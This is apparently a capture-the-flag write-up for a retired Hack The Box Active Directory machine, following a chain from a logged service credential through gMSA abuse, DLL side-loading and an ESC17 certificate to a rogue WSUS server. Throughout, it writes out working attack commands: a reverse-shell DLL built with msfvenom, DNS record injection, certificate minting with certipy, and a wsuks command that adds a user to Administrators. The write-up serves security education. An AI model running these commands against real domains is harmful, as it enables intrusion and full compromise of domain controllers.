# Logging — Hack The Box (retired)

**Medium · Windows / AD**

*Flag values redacted; target/VPN addresses generalised.*

**OS:** Windows Server 2019 · Active Directory Domain Controller
**Difficulty:** Medium
**Path:** log-leaked service credential → predictable rotation → GenericWrite over a
gMSA → WinRM → insecure update task DLL side-load (user) → **ESC17** cert + AD-DNS
write → **rogue-WSUS MITM** → SYSTEM on the DC

This is an assumed-breach AD box: you start with one throwaway domain credential and
climb through a chain where every rung is a small misconfiguration. Nothing here is a
memory-corruption exploit — it is delegated permissions, a predictable password, a
sloppy updater, and a certificate template that lets you impersonate the patch server.

## Recon

`nmap -sCV` shows the classic DC set — 53/88/389/636/445/5985/3268 — plus 80 (a
default IIS page, a decoy). The LDAP certificate SANs give the names:
`DC01.logging.htb`, domain `logging.htb`. Add them to `hosts`.

The web server is a red herring; Kerberos + LDAP + SMB + WinRM say the box is an AD
exercise, so authenticated enumeration is the play.

## Foothold data — the assumed-breach credential

`wallace.everette : Welcome2026@` authenticates to **SMB and LDAP but not WinRM**
(authorization, not a bad password). So the first job is enumeration, not a shell.

### A credential in a log on a readable share

`nxc ... --shares` lists a non-default **`Logs`** share. Spidering it pulls four log
files from an "IdentitySync" service. Three are noise; `IdentitySync_Trace_*.log`
records the service's LDAP bind **in cleartext**:

```
svc_recovery : Em3rg3ncyPa$$2025
```

The very next log line is an `LDAP_INVALID_CREDENTIALS` error — the password is stale.

### Guessing the rotation, not the password

LDAP shows `svc_recovery`'s `pwdLastSet` is *newer* than the log, and the password is
year-stamped. The box is themed 2026, so the rotated value is **`Em3rg3ncyPa$$2026`**.
It validates — but only over **Kerberos** (`-k`), because `svc_recovery` is in
**Protected Users**, which disables NTLM. (Fix your clock if you hit `KRB_AP_ERR_SKEW`.)

Still no WinRM.

## User — gMSA abuse → an insecure updater

### GenericWrite over a gMSA

BloodHound shows the one meaningful edge: `svc_recovery` → **GenericWrite** →
`MSA_HEALTH$`, a **group-managed service account** in **Remote Management Users**.
You can't read its password directly, but GenericWrite lets you rewrite *who may*:

```
bloodyAD ... -k add gmsaGroup MSA_HEALTH$ svc_recovery
nxc ldap ... -k --gmsa           # → msa_health$ NT hash
```

`msa_health$` authenticates to **WinRM** (Pass-the-Hash) — the first interactive shell.

### The update task that runs as someone else

In `msa_health$`'s profile, `monitor.ps1` watches a scheduled task **`UpdateChecker
Agent`**. Its XML shows it runs `C:\Program Files\UpdateMonitor\UpdateMonitor.exe`
**every 3 minutes**, authored by Administrator but executing as the SID for
**`jaylee.clifton`** (a member of the **IT** group).

`UpdateMonitor.exe`'s own log tells you exactly how to hijack it:

```
No updates found locally: C:\ProgramData\UpdateMonitor\Settings_Update.zip.
Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll
Failed to load settings_update.dll. Error code: 126   (module not found)
```

`C:\ProgramData\UpdateMonitor` is **Users-writable**. The updater extracts a
`Settings_Update.zip` you control and `LoadLibrary`s the DLL inside it. Drop a
32-bit reverse-shell DLL (the binary is a 32-bit .NET assembly), zip it as
`settings_update.dll`, place the zip, and wait one cycle:

```
msfvenom -p windows/shell_reverse_tcp LHOST=… LPORT=… -f dll -o settings_update.dll
zip Settings_Update.zip settings_update.dll
```

Three minutes later: a shell as **`jaylee.clifton`** → **user.txt**.

## Root — ESC17 + DNS + rogue WSUS

Back in BloodHound, `jaylee`'s IT membership grants enrollment on a certificate
template named **`UpdateSrv`**. Enumerate AD CS *as jaylee* — the enrollment right is
per-principal, so a low-priv user sees "no templates" while jaylee sees the flaw. Grab
a TGT without a password using Rubeus `tgtdeleg`, convert to a ccache, and:

```
certipy find -k -vulnerable -stdout        # UpdateSrv → ESC17
```

**ESC17** = the enrollee supplies the subject **and** the template allows **Server
Authentication**. That combination lets you mint a TLS server certificate for *any name
you choose*. What name is worth impersonating? A support ticket on jaylee's box
(`Documents\Tickets\...WSUS_Remediation...html`) — and the template's own name — point
at **`wsus.logging.htb`**: the DC is a WSUS client of its own update server.

Two more facts complete the picture: jaylee has **CREATE_CHILD on the AD-integrated DNS
zone**, and `wsus.logging.htb` **doesn't resolve yet** (NXDOMAIN). So:

```
# 1. point the WSUS name at us
bloodyAD ... -k add dnsRecord wsus <attacker-ip>

# 2. mint a Server-Auth cert for that name (ESC17)
certipy req ... -template UpdateSrv -dns wsus.logging.htb   # → wsus.pfx → wsus.pem

# 3. become the WSUS server
wsuks -t DC01.logging.htb --WSUS-Server wsus.logging.htb --tls-cert wsus.pem \
      -I tun0 --serve-only -c '/accepteula /s cmd /c "net localgroup administrators <user> /add"'
```

The DC resolves `wsus.logging.htb` to us, connects over TLS, **trusts our CA-issued
certificate**, and installs our "update" — a signed `PsExec64.exe` running our command
**as SYSTEM**. Nudging a client-side scan (`wuauclt /detectnow`) speeds the poll; within
a minute wsuks logs the `GetConfig`/`GetCookie`/`SyncUpdates` handshake and the
`PsExec64.exe` fetch, and the low-priv `wallace.everette` lands in local
**Administrators** on the DC.

```
nxc smb DC01.logging.htb -u wallace.everette -p 'Welcome2026@'    # (Pwn3d!)
```

**root.txt** sits on `toby.brynleigh`'s desktop.

## Why it worked — the one-line lessons

- A **credential in a log** on a readable share is the whole foothold. Never log secrets.
- **GenericWrite over a gMSA** is a password read: rewrite the allowed-readers list.
- An updater that loads a DLL from a **user-writable** path is arbitrary code as whoever
  runs it.
- **ESC17** turns "enroll a cert" into "mint a TLS identity for any host." Combined with
  **DNS write** and a **WSUS client that doesn't pin its server**, that is SYSTEM on the DC.

## What broke, and what I'd fix first

Defensively, the earliest cut is the logged credential. Systemically, the ESC17 template
plus an unpinned WSUS client is the crown-jewel issue: any IT-group member can become
SYSTEM on the domain controller.
